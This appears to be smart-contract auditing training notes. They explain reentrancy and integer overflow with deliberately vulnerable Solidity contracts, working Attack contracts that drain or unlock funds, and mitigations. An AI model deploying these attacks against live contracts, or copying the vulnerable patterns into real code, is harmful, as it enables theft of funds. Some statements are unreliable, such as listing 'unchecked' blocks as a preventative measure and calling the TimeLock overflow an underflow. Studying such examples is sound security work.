# GUILD-AUDIT-Smart-contract-Audting-Training-week3-4-5-6

These are smart contract attack vectors and vulnerability with code examples.

## SOLIDITY ATTACK VECTORS: #1 - REENTRANCY ATTACK

A reentrancy attack in solidity repeatedly withdraws funds from a smart contract and transfers them to an unauthorized contract until the funds have been exhausted. The attack occurs when a smart contract function temporarily gives up control flow of the transaction by making an external call to a contract that is sometimes written by unknown or possibly hostile actors.

The following are prominent reentrancy attacks in blockchain protocols: The DAO hack, Lendf.me, Fei Protocol, Paraluni, Grim Finance, SIREN Protocol, and Cream Finance.

There are two types of reentrancy attacks: a single function and cross-function reentrancy attack. 

1. Single Reentrancy Attacks: occurs when the vulnerable function is the same function the attacker is trying to recursively call.

2. Cross-function Reentrancy Attacks: is feasible only when a vulnerable function shares state with another function that has a desirable effect for the attacker.

### How does a reentrancy attack work? 
A reentrancy attack creates a recursive process that transfers funds between two smart contracts, the vulnerable contract and the malicious contract. Here are the steps of a reentrancy attack:

![Reentrancy Attack Illustration](/images/solidity-reentrancy-attack.jpg "Reentrancy Attack Illustration")

1. The bad actor makes a call on the vulnerable contract, "`EtherStore`", to transfer funds to the malicious contract, "`Attack`".
2. Contract `EtherStore` determines whether the attacker has the necessary funds, then proceeds to transfer the funds to contract `Attack`.
3. Once contract `Attack` receives the funds, it executes a callback function which calls back into contract `EtherStore` before the balance is updated.
4. This recursive process continues until all funds have been exhausted and transferred.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

### How to Prevent a Reentrancy Attack
Developing a rigorous blockchain security framework is critical to prevent and mitigate potential damage from a reentrancy attack. The following anti-reentrancy best practices will help developers and the broader web3 community secure their funds: checks, effects and interactions (CEI), reentrancy guards, pull payments, and gas limits.

1. Checks, Effects, and Interactions (CEI)
The CEI process is a rudimentary method to prevent reentrancy. `Checks` refer to the truthfulness of the condition, `effects` refer to state modifications that result from interaction, and `interactions` refer to transactions between functions or contracts. State updates are performed before the value transfer that they record.

2. Potential security risks and loopholes associated with placing executive effects before interactions are an important consideration for developers. 

3. Reentrancy Guard or Mutex
A reentrancy guard or mutex can be created as a function or function modifier. A boolean lock is placed around the function call that is vulnerable to reentrancy. This implies that the initial state of ‘locked’ is false, however, it is set to true immediately before the vulnerable function execution begins and is then quickly set back to false after termination. 

4. Pull Payment
A more secure end-to-end transaction is by using the pull payment methodology. The pull payment process mandates using an intermediary escrow to send funds and avoids direct contact with a potentially hostile contact. By sending funds via an intermediary escrow, the smart contract's funds are protected from a reentrancy attack. The escrow could be subject to reentrancy if it manages funds for multiple accounts. The CEI pattern and reentrancy guard should be implemented where appropriate. 

5. Gas limit
Gas limits are not an optimal method to avert an attacker since gas costs depend on Ethereum’s opcodes, which are subject to change. On the other hand, smart contract code is immutable. Understanding the difference between the send, transfer, and call functions is important. Send and transfer are effectively the same, but the transfer will revert if the transaction fails and send will not. Unlike send and transfer, the call function does not have a gas limit and will forward its gas to execute multi-contract transactions. Unfortunately, this also means that reentrancy attacks are possible. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract EtherStore {
    mapping(address => uint) public balances;
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public noReentrant {
        uint bal = balances[msg.sender];
        require(bal > 0);

        balances[msg.sender] = 0; // the balance is updated before the transfer

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```
In the contract above, the state was updated before the transfer, there is also a reentrancy modifier guard. These two methods can be used to prevent reentrancy.

### CONCLUSION
Re-entrancy attacks are made possible by the use of a logical but insecure code pattern when performing transfers within Ethereum smart contracts. Bad actors exploit the blockchain by implementing reentrancy attacks to transfer and drain funds from vulnerable smart contracts.

## SOLIDITY ATTACK VECTORS: #2 - Arithmetic Overflow and Underflow

### Overflow
Overflow is a state a uint (unsigned integer) reaches its maximum value, the next element added will return the default value. **uint8**, can hold values within the range(0, 255), if the value of an arithmetic operation becomes greater than 255, the value is set to zero which is an incorrect calculation.

### Underflow
Overflow is a state a uint (unsigned integer) reaches its minimum value, the next element subtracted will return the maximum byte size. **uint8**, can hold values within the range(0, 255), if the value of an arithmetic operation becomes lesser than 0, the value is set to 255 which is an incorrect calculation.

![Arithmetic Overflow and Underflow Illustration](/images/overflow-underflow.png "Arithmetic Overflow and Underflow Illustration")

In the **TimeLock** contract below, you can deposit funds into the contract, but you can only withdraw the funds after a week has passed. The lock time can also be increased by _increaseLockTime_ function.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

The funds deposited is stored in the **locktime** array. To exploit this contract, the attacker have to bypass the check for the lockTime period of the user.
``` 
require(block.timestamp > lockTime[msg.sender], "Lock time not expired"); 
```
By doing this:

```solidity
contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
```

In the _attack_ function, the user deposit ether into the contract and calls the _increaseLockTime_ function to cause `Underflow`.
```
type(uint).max + 1 - timeLock.lockTime(address(this))
```
we are subtracting the current timestamp value in the lockTime array, which after execution results in the value zero. And now, you can now withdraw your funds without any restrictions.

### Preventative Techniques
* Use _SafeMath_ libraries for arithmetic operations to prevent arithmetic overflow and underflow

* There is a new "unchecked" block you can wrap your variables around.
```
unchecked {
    myUint8--;
}
```

* Solidity ≥0.8 defaults to throwing an error for overflow / underflow. It is handled by default.